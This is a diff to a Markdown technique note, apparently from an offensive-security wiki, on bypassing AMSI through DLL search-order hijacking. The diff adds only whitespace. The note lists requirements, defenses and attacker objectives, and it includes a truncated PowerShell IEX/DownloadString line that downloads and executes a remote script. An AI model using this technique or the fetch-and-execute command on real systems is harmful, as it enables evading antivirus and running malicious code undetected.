@@ -27,6 +27,8 @@ From a technical perspective, this technique involves identifying a vulnerable a
 
 The business value of this technique is that it allows attackers to bypass security measures and execute code on a system undetected, potentially allowing them to steal sensitive data or gain access to other systems on a network.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable application that uses the AmsiScanBuffer function
@@ -34,6 +36,8 @@ The business value of this technique is that it allows attackers to bypass secur
 1. Ability to hijack the DLL search order of the targeted application
 
 1. Ability to create a malicious DLL with a modified version of the AmsiScanBuffer function
+
+ 
 
 ## Defense
 
@@ -43,17 +47,27 @@ The business value of this technique is that it allows attackers to bypass secur
 
 1. Monitor system logs for suspicious activity related to DLL search order hijacking
 
+ 
+
 ## Objectives
 
 1. To bypass antivirus and other security measures
 
 1. To execute code on a system undetected
 
+ 
+
 # Instructions
 
 1. IEX
 
+ 
+
+
+
 **Code**: [[IEX([Net.Webclient]::new().DownloadString("https:/]]
+
+
 
 > The IEX (Invoke-Expression) command is used to execute a string as a command. In this case, the command downloads a script from a malicious URL and executes it on the system. This can result in the installation of malware or other malicious activities.
 
@@ -61,3 +75,5 @@ The business value of this technique is that it allows attackers to bypass secur
 
 - [[Patching amsi.dll AmsiScanBuffer by rasta-mouse]]
 - [[The Short version of dont use powershell net webclient]]
+
+
